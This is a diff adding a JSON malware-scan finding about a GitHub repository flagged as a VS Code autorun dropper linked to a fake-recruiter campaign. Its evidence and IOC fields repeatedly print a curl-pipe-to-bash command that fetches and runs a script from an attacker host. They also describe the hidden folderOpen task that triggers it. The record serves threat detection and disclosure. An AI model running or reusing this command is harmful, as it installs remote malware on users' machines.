@@ -1,0 +1,198 @@
+{
+  "finding": {
+    "key": "repository:simalchaudhari/jaggery-backend",
+    "kind": "repository",
+    "family": "",
+    "id": "simalchaudhari/jaggery-backend",
+    "url": "https://github.com/SimalChaudhari/jaggery-backend",
+    "registry": "github",
+    "owner": "simalchaudhari",
+    "status": "confirmed",
+    "confidence": "",
+    "score": 9,
+    "detection_method": "malicious_owner",
+    "attribution": "",
+    "campaign_id": "GW-C-498a0aeb",
+    "rules": "install_hook/vscode-autorun; code_execution/js-exec",
+    "evidence_locations": ".vscode/tasks.json:0; src/.vscode/tasks.json:0; src/user/.vscode/tasks.json:0; src/use-case/.vscode/tasks.json:0; src/size/.vscode/tasks.json:0; src/service/.vscode/tasks.json:0; src/seed/.vscode/tasks.json:0; src/review/.vscode/tasks.json:0; src/product/.vscode/tasks.json:0; src/order/.vscode/tasks.json:0; src/middleware/.vscode/tasks.json:0; src/lib/.vscode/tasks.json:0; src/cloudinary/.vscode/tasks.json:0; src/category/.vscode/tasks.json:0; src/auth/.vscode/tasks.json:0; src/address/.vscode/tasks.json:0; api/.vscode/tasks.json:0; src/order/orders.service.ts:92; src/order/orders.service.ts:107; src/order/orders.service.ts:122",
+    "c2_hosts": "default-configuration.vercel.app",
+    "iocs": "default-configuration.vercel.app; https://default-configuration.vercel.app/settings/linux?flag=9-test; curl https://default-configuration.vercel.app/settings/linux?flag=9-test | bash; .vscode/tasks.json",
+    "matched_signatures": "",
+    "reasons": "repository under owner SimalChaudhari of a known-malicious repo | Tier-2 confirmed (bash score 8)",
+    "osm_status": "submitted",
+    "osm_threat_id": "fa93efbf-a70d-46eb-af96-7874165364c5",
+    "first_seen": "hunt-20260702T052939Z",
+    "last_seen": "hunt-20260702T052939Z",
+    "evidence_file": "repositories/simalchaudhari_jaggery-backend.json",
+    "reviewer_decision": "",
+    "notes": ""
+  },
+  "evidence": [
+    {
+      "file": ".vscode/tasks.json",
+      "line": 0,
+      "category": "install_hook",
+      "rule": "vscode-autorun",
+      "snippet": "curl https://default-configuration.vercel.app/settings/linux?flag=9-test | bash curl https://default-configuration.vercel.app/settings/linux?flag=9-test | sh curl https://default-configuration.vercel."
+    },
+    {
+      "file": "src/.vscode/tasks.json",
+      "line": 0,
+      "category": "install_hook",
+      "rule": "vscode-autorun",
+      "snippet": "curl https://default-configuration.vercel.app/settings/linux?flag=9-test | bash curl https://default-configuration.vercel.app/settings/linux?flag=9-test | sh curl https://default-configuration.vercel."
+    },
+    {
+      "file": "src/user/.vscode/tasks.json",
+      "line": 0,
+      "category": "install_hook",
+      "rule": "vscode-autorun",
+      "snippet": "curl https://default-configuration.vercel.app/settings/linux?flag=9-test | bash curl https://default-configuration.vercel.app/settings/linux?flag=9-test | sh curl https://default-configuration.vercel."
+    },
+    {
+      "file": "src/use-case/.vscode/tasks.json",
+      "line": 0,
+      "category": "install_hook",
+      "rule": "vscode-autorun",
+      "snippet": "curl https://default-configuration.vercel.app/settings/linux?flag=9-test | bash curl https://default-configuration.vercel.app/settings/linux?flag=9-test | sh curl https://default-configuration.vercel."
+    },
+    {
+      "file": "src/size/.vscode/tasks.json",
+      "line": 0,
+      "category": "install_hook",
+      "rule": "vscode-autorun",
+      "snippet": "curl https://default-configuration.vercel.app/settings/linux?flag=9-test | bash curl https://default-configuration.vercel.app/settings/linux?flag=9-test | sh curl https://default-configuration.vercel."
+    },
+    {
+      "file": "src/service/.vscode/tasks.json",
+      "line": 0,
+      "category": "install_hook",
+      "rule": "vscode-autorun",
+      "snippet": "curl https://default-configuration.vercel.app/settings/linux?flag=9-test | bash curl https://default-configuration.vercel.app/settings/linux?flag=9-test | sh curl https://default-configuration.vercel."
+    },
+    {
+      "file": "src/seed/.vscode/tasks.json",
+      "line": 0,
+      "category": "install_hook",
+      "rule": "vscode-autorun",
+      "snippet": "curl https://default-configuration.vercel.app/settings/linux?flag=9-test | bash curl https://default-configuration.vercel.app/settings/linux?flag=9-test | sh curl https://default-configuration.vercel."
+    },
+    {
+      "file": "src/review/.vscode/tasks.json",
+      "line": 0,
+      "category": "install_hook",
+      "rule": "vscode-autorun",
+      "snippet": "curl https://default-configuration.vercel.app/settings/linux?flag=9-test | bash curl https://default-configuration.vercel.app/settings/linux?flag=9-test | sh curl https://default-configuration.vercel."
+    },
+    {
+      "file": "src/product/.vscode/tasks.json",
+      "line": 0,
+      "category": "install_hook",
+      "rule": "vscode-autorun",
+      "snippet": "curl https://default-configuration.vercel.app/settings/linux?flag=9-test | bash curl https://default-configuration.vercel.app/settings/linux?flag=9-test | sh curl https://default-configuration.vercel."
+    },
+    {
+      "file": "src/order/.vscode/tasks.json",
+      "line": 0,
+      "category": "install_hook",
+      "rule": "vscode-autorun",
+      "snippet": "curl https://default-configuration.vercel.app/settings/linux?flag=9-test | bash curl https://default-configuration.vercel.app/settings/linux?flag=9-test | sh curl https://default-configuration.vercel."
+    },
+    {
+      "file": "src/middleware/.vscode/tasks.json",
+      "line": 0,
+      "category": "install_hook",
+      "rule": "vscode-autorun",
+      "snippet": "curl https://default-configuration.vercel.app/settings/linux?flag=9-test | bash curl https://default-configuration.vercel.app/settings/linux?flag=9-test | sh curl https://default-configuration.vercel."
+    },
+    {
+      "file": "src/lib/.vscode/tasks.json",
+      "line": 0,
+      "category": "install_hook",
+      "rule": "vscode-autorun",
+      "snippet": "curl https://default-configuration.vercel.app/settings/linux?flag=9-test | bash curl https://default-configuration.vercel.app/settings/linux?flag=9-test | sh curl https://default-configuration.vercel."
+    },
+    {
+      "file": "src/cloudinary/.vscode/tasks.json",
+      "line": 0,
+      "category": "install_hook",
+      "rule": "vscode-autorun",
+      "snippet": "curl https://default-configuration.vercel.app/settings/linux?flag=9-test | bash curl https://default-configuration.vercel.app/settings/linux?flag=9-test | sh curl https://default-configuration.vercel."
+    },
+    {
+      "file": "src/category/.vscode/tasks.json",
+      "line": 0,
+      "category": "install_hook",
+      "rule": "vscode-autorun",
+      "snippet": "curl https://default-configuration.vercel.app/settings/linux?flag=9-test | bash curl https://default-configuration.vercel.app/settings/linux?flag=9-test | sh curl https://default-configuration.vercel."
+    },
+    {
+      "file": "src/auth/.vscode/tasks.json",
+      "line": 0,
+      "category": "install_hook",
+      "rule": "vscode-autorun",
+      "snippet": "curl https://default-configuration.vercel.app/settings/linux?flag=9-test | bash curl https://default-configuration.vercel.app/settings/linux?flag=9-test | sh curl https://default-configuration.vercel."
+    },
+    {
+      "file": "src/address/.vscode/tasks.json",
+      "line": 0,
+      "category": "install_hook",
+      "rule": "vscode-autorun",
+      "snippet": "curl https://default-configuration.vercel.app/settings/linux?flag=9-test | bash curl https://default-configuration.vercel.app/settings/linux?flag=9-test | sh curl https://default-configuration.vercel."
+    },
+    {
+      "file": "api/.vscode/tasks.json",
+      "line": 0,
+      "category": "install_hook",
+      "rule": "vscode-autorun",
+      "snippet": "curl https://default-configuration.vercel.app/settings/linux?flag=9-test | bash curl https://default-configuration.vercel.app/settings/linux?flag=9-test | sh curl https://default-configuration.vercel."
+    },
+    {
+      "file": "src/order/orders.service.ts",
+      "line": 92,
+      "category": "code_execution",
+      "rule": "js-exec",
+      "snippet": ".exec()"
+    },
+    {
+      "file": "src/order/orders.service.ts",
+      "line": 107,
+      "category": "code_execution",
+      "rule": "js-exec",
+      "snippet": ".exec()"
+    },
+    {
+      "file": "src/order/orders.service.ts",
+      "line": 122,
+      "category": "code_execution",
+      "rule": "js-exec",
+      "snippet": ".exec()"
+    }
+  ],
+  "commit_sha": null,
+  "osm_report": {
+    "report_type": "repository",
+    "resource_identifier": "https://github.com/simalchaudhari/jaggery-backend",
+    "version_info": "all",
+    "threat_description": "VS Code autorun dropper. Payload in .vscode/tasks.json, src/.vscode/tasks.json, src/user/.vscode/tasks.json and 14 more files.\nOutbound: fetch-and-run. It downloads code from default-configuration.vercel.app and executes it (.vscode/tasks.json, src/.vscode/tasks.json).\nRuns automatically when the folder is opened in VS Code (hidden folderOpen task that fetches and runs a remote script).\nThe same dropper is planted in 17 directories.\nMatches PolinRider / Contagious Interview (DPRK): fake-recruiter coding tasks that run a downloader when opened in VS Code. Payload host: default-configuration.vercel.app.\nCampaign GW-C-498a0aeb: one of 89 confirmed repos across 14 accounts sharing the dropper URL shape settings/{os}?flag=. Payload served from 3 distinct hosts, including default-configuration-sandy.vercel.app, default-configuration.vercel.app, vscode-extension-260120.vercel.app.\nAttribution: we assess this repository as PROBABLE North Korea PolinRider activity. Signals: Delivery vector matches Contagious-Interview tradecraft: vscode-folderopen-autorun, dprk-dropper-path-shape; Payload host is curated known-DPRK / Contagious-Interview infrastructure: default-configuration.vercel.app.\nConfirmed by static analysis; the code was read, never executed.",
+    "payload_description": "Malicious payload found in: .vscode/tasks.json, src/.vscode/tasks.json, src/user/.vscode/tasks.json, src/use-case/.vscode/tasks.json, src/size/.vscode/tasks.json\n- Outbound: fetch-and-run. It downloads code from default-configuration.vercel.app and executes it (.vscode/tasks.json, src/.vscode/tasks.json).\n- .vscode/tasks.json: VS Code task with runOn: folderOpen; runs the moment the folder is opened, no install or click needed (+16 more)\n- Attacker hosts: default-configuration.vercel.app",
+    "publisher": "simalchaudhari",
+    "severity_level": "critical",
+    "tags": [
+      "supply-chain",
+      "github-repo",
+      "polinrider",
+      "contagious-interview",
+      "fake-recruiter",
+      "dprk",
+      "north-korea",
+      "vscode-folderopen-autorun",
+      "dropper"
+    ],
+    "evidence_references": "https://github.com/simalchaudhari/jaggery-backend/blob/HEAD/.vscode/tasks.json\nhttps://github.com/simalchaudhari/jaggery-backend/blob/HEAD/src/.vscode/tasks.json\nhttps://github.com/simalchaudhari/jaggery-backend/blob/HEAD/src/user/.vscode/tasks.json\nhttps://github.com/simalchaudhari/jaggery-backend/blob/HEAD/src/use-case/.vscode/tasks.json\nhttps://github.com/simalchaudhari/jaggery-backend/blob/HEAD/src/size/.vscode/tasks.json\nhttps://github.com/simalchaudhari/jaggery-backend/blob/HEAD/src/service/.vscode/tasks.json\nhttps://github.com/simalchaudhari/jaggery-backend/blob/HEAD/src/seed/.vscode/tasks.json\nhttps://github.com/simalchaudhari/jaggery-backend/blob/HEAD/src/review/.vscode/tasks.json\nhttps://github.com/simalchaudhari/jaggery-backend/blob/HEAD/src/product/.vscode/tasks.json\nhttps://github.com/simalchaudhari/jaggery-backend/blob/HEAD/src/order/.vscode/tasks.json\nhttps://github.com/simalchaudhari/jaggery-backend/blob/HEAD/src/middleware/.vscode/tasks.json\nhttps://github.com/simalchaudhari/jaggery-backend/blob/HEAD/src/lib/.vscode/tasks.json\nhttps://github.com/simalchaudhari/jaggery-backend/blob/HEAD/src/cloudinary/.vscode/tasks.json\nhttps://github.com/simalchaudhari/jaggery-backend/blob/HEAD/src/category/.vscode/tasks.json\nhttps://github.com/simalchaudhari/jaggery-backend/blob/HEAD/src/auth/.vscode/tasks.json",
+    "verified_iocs": "default-configuration.vercel.app\nhttps://default-configuration.vercel.app/settings/linux?flag=9-test\ncurl https://default-configuration.vercel.app/settings/linux?flag=9-test | bash\n.vscode/tasks.json",
+    "contributors": [],
+    "first_seen": "2026-07-02T05:29:39Z",
+    "last_seen": "2026-07-02T05:29:39Z"
+  }
+}
